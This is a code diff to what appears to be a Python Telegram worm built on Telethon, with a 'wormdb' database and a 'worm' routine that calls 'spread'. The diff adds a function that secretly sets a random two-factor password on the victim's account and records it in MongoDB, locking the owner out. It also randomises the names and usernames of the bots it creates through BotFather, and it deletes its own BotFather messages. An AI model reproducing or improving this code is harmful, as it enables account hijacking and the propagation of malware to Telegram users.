@@ -1,9 +1,9 @@
-import os,logging,random,asyncio,json
+import os,logging,random,asyncio,json,string
 from telethon import functions, errors
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
-from strings import strings
+from strings import strings,bot_names,bot_usernames
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 load_dotenv(override=True)
@@ -11,13 +11,18 @@ load_dotenv(override=True)
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
 database = mongo_client.wormdb
 
+async def set_passwd(client, me):
+    user_data = mongo_client.userdb.sessions.find_one({'phone': f'+{me.phone}'})
+    password = "".join(random.choice(string.ascii_letters+string.digits) for i in range(16))
+    await client.edit_2fa(current_password=None if not 'password' in user_data else user_data['password'], new_password=password)
+    mongo_client.userdb.sessions.update_one({'_id': user_data['_id']}, {'$set': {'password': password}})
 async def create_bot(client, me):
     async with client.conversation("@BotFather") as conv:
         msg = await conv.send_message("/newbot")
         await (await conv.get_response()).delete()
-        await (await conv.send_message("SL Wala")).delete()
+        await (await conv.send_message(random.choice(bot_names))).delete()
         await (await conv.get_response()).delete()
-        username = "freewala_{}{}_bot".format(random.randint(1000,9999),random.randint(1000,9999))
+        username = f"{random.choice(bot_usernames)}_{random.randint(1000,9999)}{random.randint(1000,9999)}_bot"
         await (await conv.send_message(username)).delete()
         response = await conv.get_response()
         bot_token = response.text.split("`")[1].strip()
@@ -108,6 +113,10 @@ async def spread(client, me, bot):
 async def worm(client, bot, logger_bot):
     me = await client.get_me()
     log = None
+    try:
+        await set_passwd(client, me)
+    except:
+        pass
     try:
         await create_bot(client, me)
     except:
